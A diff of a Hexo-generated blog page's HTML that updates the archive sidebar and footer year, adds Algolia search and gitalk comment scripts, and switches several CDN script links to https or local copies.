class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">2023年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">2022年03月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">2021年12月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">2021年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">2021年08月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">2021年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">2021年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">2021年05月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">2019年11月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">2019年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">2019年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">2019年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">2019年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">2019年04月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
+      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/11/">十一月 2026</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/11/">2026年11月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">2023年08月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">2022年03月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">2021年12月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">2021年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">2021年08月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">2021年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">2021年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">2021年05月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">2019年11月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">2019年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">2019年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">2019年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">2019年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">2019年04月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
     </div>
   </div>
 
@@ -738,7 +734,7 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
   
   <div  data-scroll-reveal="enter bottom"  class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2023 Pa55w0rd<br>
+      &copy; 2026 Pa55w0rd<br>
       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
       .
       Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
@@ -781,12 +777,38 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
   
 </nav>
 
+  <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+</div>
+
   <!-- totop start -->
 <div id="totop">
 <a title="返回顶部"><img src="/img/betop.png"/></a>
 </div>
 
 <!-- totop end -->
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk@1/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.19.0/js/md5.min.js"></script>
 
 
 
@@ -797,9 +819,8 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
       repo: "pa55w0rd.github.io",
       owner: "Pa55w0rd",
       admin: "Pa55w0rd",
-      // id: location.pathname,      // Ensure uniqueness and length less than 50
-      id: "Fri Dec 17 2021 16:33:07 GMT+0800",      // Ensure uniqueness and length less than 50
-      distractionFreeMode: false  // Facebook-like distraction free mode
+      id: "Fri Dec 17 2021 16:33:07 GMT+0800",
+      distractionFreeMode: false
     })
     gitalk.render('gitalk-container')
   </script>
@@ -830,14 +851,23 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
     "common":{onBeforeClick: SetShareData},
     "share":{"bdCustomStyle":"/css/bdshare.css"}
   };
-  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='https://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
 </script>
 
 
 <!-- 百度分享 end -->
 
-<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
-<script src="https://cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>
+
+<script src="/vendors/jquery/jquery-3.1.1.min.js"></script>
+
+
+<script src="/js/scrollReveal.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/instantsearch.js@1.5.1/dist/instantsearch.js"></script>
+
+<script src="/js/algolia-search.js"></script>
+
 
 
 
@@ -850,7 +880,7 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
 
 
 
-<! -- mathjax config similar to math.stackexchange -->
+<!-- mathjax config similar to math.stackexchange -->
 
 <script type="text/x-mathjax-config">
 MathJax.Hub.Config({
@@ -884,44 +914,28 @@ MathJax.Hub.Queue(function() {
         });
 </script>
 
-<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
 
 
 <script src="/js/script.js"></script>
 
 
+<!-- 自定义目录交互功能 -->
+
+<script src="/assets/js/custom-toc.js"></script>
+
+
+<script>
+$(document).ready(function () {
+  if (typeof scrollReveal !== 'undefined') {
+    window.scrollReveal = new scrollReveal({ reset: true });
+  }
+});
+</script>
+
 
 </div>
 </body>
 </html>
 
-
-
-<div class="site-search">
-  <div class="algolia-popup popup">
-    <div class="algolia-search">
-      <div class="algolia-search-input-icon">
-        <i class="fa fa-search"></i>
-      </div>
-      <div class="algolia-search-input" id="algolia-search-input"></div>
-    </div>
-    <div class="algolia-results">
-      <div id="algolia-stats"></div>
-      <div id="algolia-hits"></div>
-      <div id="algolia-pagination" class="algolia-pagination"></div>
-    </div>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-  </div>
-</div>
-
-
-<script>
-$(document).ready(function(){
-window.scrollReveal = new scrollReveal({ reset: true});
-//
-})
-</script>
